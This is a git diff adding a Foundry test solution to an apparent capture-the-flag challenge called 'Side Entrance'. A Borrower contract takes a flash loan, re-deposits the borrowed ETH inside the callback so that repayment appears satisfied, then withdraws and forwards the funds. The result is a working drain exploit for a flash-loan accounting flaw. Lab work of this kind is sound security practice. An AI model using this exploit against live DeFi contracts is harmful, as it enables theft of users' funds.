@@ -44,8 +44,12 @@ contract SideEntranceChallenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
-    function test_sideEntrance() public checkSolvedByPlayer {
-        
+    function test_sideEntrance() public 
+    checkSolvedByPlayer 
+    {
+        Borrower borrower = new Borrower(pool, recovery);
+        borrower.igniteFlashLoan();   
+        borrower.recover();
     }
 
     /**
@@ -54,5 +58,38 @@ contract SideEntranceChallenge is Test {
     function _isSolved() private view {
         assertEq(address(pool).balance, 0, "Pool still has ETH");
         assertEq(recovery.balance, ETHER_IN_POOL, "Not enough ETH in recovery account");
+    }
+}
+
+interface IFlashLoanEtherReceiver {
+    function execute() external payable;
+}
+
+contract Borrower is IFlashLoanEtherReceiver {
+    SideEntranceLenderPool pool;
+    address recovery;
+    
+    constructor (SideEntranceLenderPool _pool, address _recovery) {
+        pool = _pool;
+        recovery = _recovery;
+    }
+
+    // 1. Request the flash loan
+    function igniteFlashLoan() public {
+        pool.flashLoan(address(pool).balance);
+    }
+    // 2. The pool will trigger the execute call back, that reenter to deposit the borrowed funds
+    function execute() payable external {
+        pool.deposit{ value:msg.value }();
+    }
+
+    // 3. Withdraw the funds
+    function recover() public {
+        pool.withdraw();
+    }
+
+    // When receive transfer it to the recovery account
+    receive() external payable {
+        recovery.call{ value: msg.value }('');
     }
 }
